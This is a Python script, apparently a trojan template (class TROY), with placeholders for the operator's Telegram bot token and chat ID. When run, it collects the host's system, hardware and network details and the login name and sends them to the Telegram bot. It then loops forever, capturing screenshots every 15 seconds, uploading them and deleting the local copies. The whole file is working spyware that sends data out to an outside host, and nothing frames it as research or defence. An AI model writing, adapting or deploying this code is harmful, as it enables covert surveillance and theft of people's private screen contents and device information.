import psutil
import platform
import tabulate
import os.path
import os
import requests
from mss import mss
from datetime import datetime
from time import sleep
import json



#APPLICATION NAME 
APPNAME = "ENTER THE NAME YOU WANT TO GIVE TO YOUR APPLICATION"
#BOTTOKEN AND CHATID ARE WRITTEN HERE
BOTTOKEN = "YOUR BOT TOKEN HERE"
CHATID = "YOUR CHAT ID HERE"

#FILES WHERE THE SCREENSHOTS AND LOGS ARE SAVED
APPDATA = os.getenv('APPDATA')
SOFTWAREFOLDERNAME = os.path.join(APPDATA,APPNAME)
SCREENSHOT_FOLDERPATH = os.path.join(SOFTWAREFOLDERNAME,"SCREENSHOTS")
LOGFOLDERPATH = os.path.join(SOFTWAREFOLDERNAME,"LOGFOLDER")
SCREENTIMEDELAY = 15 #DELAY IN SECONDS




#CREATES THE FOLDERS TO STORE SCREENSHOTS
FOLDERLIST = [SOFTWAREFOLDERNAME,SCREENSHOT_FOLDERPATH,LOGFOLDERPATH]
for folder in FOLDERLIST:
    if not os.path.exists(folder):
        os.makedirs(folder)
        print("[*]CREATED FOLDER")



class TROY:

    DATA_STRING = ""

    def __init__(self,YOUR_BOT_TOKEN,CHAT_ID,screenshotPath,logfilepath,delayscreen):
        self.bottoken = YOUR_BOT_TOKEN
        self.chat_id = CHAT_ID
        self.screenshotPath = screenshotPath
        self.logfilepath = logfilepath
        self.delay = delayscreen
        self.sysinfo = self.get_sys_info()
        self.boot_time = self.get_boot_time()
        self.cpu_info = self.get_cpu_info()
        self.mem_usage = self.get_mem_usage()
        self.disk_info = self.get_disk_info()
        self.net_info  = self.get_net_info()

    def get_size(self, bolter, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bolter < factor:
                return f"{bolter:.2f}{unit}{suffix}"
            
            bolter /= factor

    def get_sys_info(self):
        headers = ("Platform Tag", "Information")
        values  = []

        uname = platform.uname()

        values.append(("System", uname.system))
        values.append(("Node Name", uname.node))
        values.append(("Release", uname.release))
        values.append(("Version", uname.version))
        values.append(("Machine", uname.machine))
        values.append(("Processor", uname.processor))
        
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_boot_time(self):
        headers = ("Boot Tags", "Information")
        values  = []

        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)

        values.append(("Boot Time", f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"))

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_cpu_info(self):
        headers = ("CPU Tag", "Value")
        values  = []

        cpufreq = psutil.cpu_freq()

        values.append(("Physical Cores", psutil.cpu_count(logical=False)))
        values.append(("Total Cores", psutil.cpu_count(logical=True)))
        values.append(("Max Frequency", f"{cpufreq.max:.2f}Mhz"))
        values.append(("Min Frequency", f"{cpufreq.min:.2f}Mhz"))
        values.append(("Current Frequency", f"{cpufreq.current:.2f}Mhz"))
        values.append(("CPU Usage", f"{psutil.cpu_percent()}%"))
        
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_mem_usage(self):
        headers = ("Memory Tag", "Value")
        values  = []

        svmem = psutil.virtual_memory()
        # print(f"\n{self.get_size(svmem.total)}\n")
        swap = psutil.swap_memory()

        values.append(("Total Mem", f"{self.get_size(svmem.total)}"))
        values.append(("Available Mem", f"{self.get_size(svmem.available)}"))
        values.append(("Used Mem", f"{self.get_size(svmem.used)}"))
        values.append(("Percentage", f"{self.get_size(svmem.percent)}%"))
        
        values.append(("Total Swap", f"{self.get_size(swap.total)}"))
        values.append(("Free Swap", f"{self.get_size(swap.free)}"))
        values.append(("Used Swap", f"{self.get_size(swap.used)}"))
        values.append(("Percentage Swap", f"{self.get_size(swap.percent)}%"))
        
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_disk_info(self):
        headers = ("Device", "Mountpoint", "File System", "Total Size", "Used", "Free", "Percentage")
        values = []

        partitions = psutil.disk_partitions()

        toappend = []
        for partition in partitions:
            toappend.append(partition.device)
            toappend.append(partition.mountpoint)
            toappend.append(partition.fstype)

            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                toappend.append(self.get_size(partition_usage.total))
                toappend.append(self.get_size(partition_usage.used))
                toappend.append(self.get_size(partition_usage.free))
                toappend.append(self.get_size(partition_usage.percent))
            except PermissionError:
                toappend.append(" "); toappend.append(" "); toappend.append(" "); toappend.append(" "); 
            
            values.append(toappend)
            toappend = []

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval             

    def get_net_info(self):
        headers = ('Interface', 'IP Address', 'MAC Address', 'Netmask', 'Broadcast IP', 'Broadcast MAC')
        values = []

        if_addrs = psutil.net_if_addrs()
        toappend = []

        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                toappend.append(interface_name)
                if str(address.family) == 'AddressFamily.AF_INET':
                    toappend.append(address.address)
                    toappend.append('')
                    toappend.append(address.netmask)
                    toappend.append(address.broadcast)
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    toappend.append('')
                    toappend.append(address.address)
                    toappend.append(address.netmask)
                    toappend.append('')
                    toappend.append(address.broadcast)
                
                values.append(toappend)
                toappend = []

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_data(self):
        self.DATA_STRING = "\n" + self.sysinfo + "\n\n" + self.boot_time + "\n\n" + self.cpu_info + "\n\n" + \
                            self.mem_usage + "\n\n" + self.disk_info + "\n\n" + self.net_info + "\n\n"
        return self.DATA_STRING

    def save_data(self,path):
        if not os.path.exists(path):
            f = open(path,"w")
            f.write(self.get_data())
            f.close()
            return True
        else:
            return False


    def screenshot(self):
        with mss() as sct:
            time = datetime.now()
            strtime = time.strftime("%I_%M_%S")
            filename = sct.shot(output=os.path.join(self.screenshotPath,strtime+".png"))

    def sendfile(self,filename):
        try:
            document = open(filename, "rb")
            url = f"https://api.telegram.org/bot{self.bottoken}/sendDocument"
            response = requests.post(url, data={'chat_id': self.chat_id}, files={'document': document})
            # part below, just to make human readable response for such noobies as I
            content = response.content.decode("utf8")
            js = json.loads(content)
            document.close()
            return js
        except:
            pass
        

    def sendlogfile(self):
        path = os.path.join(self.logfilepath,"log.txt")
        reachtion = self.save_data(path)
        self.sendfile(path)

    def clearscreenshotfolder(self):
        onlyfiles = [f for f in os.listdir(self.screenshotPath) if os.path.isfile(os.path.join(self.screenshotPath, f))]
        for file in onlyfiles:
            filepath = os.path.join(self.screenshotPath,file)
            os.remove(filepath)
    def takescreenshot(self):
        self.clearscreenshotfolder()
        for i in range(4):
            self.screenshot()
            sleep(self.delay)
        onlyfiles = [f for f in os.listdir(self.screenshotPath) if os.path.isfile(os.path.join(self.screenshotPath, f))]
        for file in onlyfiles:
            filepath = os.path.join(self.screenshotPath,file)
            self.sendfile(filepath)
            os.remove(filepath)

    def sendmsg(self,message):
        try:
            url = f"https://api.telegram.org/bot{self.bottoken}/sendMessage?chat_id={self.chat_id}&text={message}"
            print(requests.get(url).json())
        except:
            pass



    
msg = f"\n\nHello from: {os.getlogin()}\n"
msg += "Time : " + datetime.now().strftime("%I:%M:%S")+"\n"
msg+= "Bot Status: Online ⭕️\n\n"

troj = TROY(YOUR_BOT_TOKEN=BOTTOKEN,screenshotPath=SCREENSHOT_FOLDERPATH,logfilepath=LOGFOLDERPATH,delayscreen=SCREENTIMEDELAY,CHAT_ID=CHATID)
troj.sendmsg(msg)
#troj.sendmsg(troj.get_data())
troj.sendlogfile()
while True:
    troj.takescreenshot()
    print("[*]SCREENSHOT SEND")

